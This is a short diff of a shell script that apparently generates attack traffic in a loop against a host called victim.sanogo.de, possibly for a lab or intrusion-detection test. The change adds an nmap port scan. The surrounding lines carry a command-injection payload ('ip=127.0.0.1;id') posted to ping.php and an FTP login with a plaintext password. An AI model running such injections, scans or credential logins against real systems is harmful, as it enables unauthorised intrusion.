@@ -48,6 +48,11 @@ f_command()
 curl -X POST -d "ip=127.0.0.1;id" -d "submit=Ping" $1
 }
 
+f_nmap()
+{
+nmap -sT $1 -p 21,53,80
+}
+
 while true
 do
   sleep 1
@@ -56,5 +61,6 @@ do
   f_ftp victim.sanogo.de lena FranzFerdi
   f_command http://victim.sanogo.de/ping.php
   f_command https://victim.sanogo.de/ping.php
+  f_nmap  victim.sanogo.de
 done
 
